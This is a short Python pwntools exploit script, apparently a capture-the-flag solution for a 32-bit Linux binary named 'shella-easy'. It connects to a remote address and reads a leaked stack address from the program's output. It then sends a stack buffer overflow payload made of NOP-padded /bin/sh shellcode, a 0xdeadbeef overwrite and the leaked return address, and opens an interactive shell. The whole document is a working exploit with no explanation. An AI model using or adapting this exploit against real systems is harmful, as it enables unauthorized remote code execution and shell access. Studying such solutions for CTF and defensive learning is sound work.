from pwn import *

context(arch='i386', os='linux')
# p = process('./shella-easy')
p = remote('52.15.182.55', 12345)

p.recvuntil("Yeah I'll have a ")
leak = p.recvuntil(' ').strip()
leak = int(leak, 16)

shellcode = asm(shellcraft.i386.sh())
shellcode = shellcode.ljust(64, '\x90')
shellcode += p32(0xdeadbeef)
shellcode += 'a' * 8
shellcode += p32(leak)
p.send(shellcode)
p.interactive()
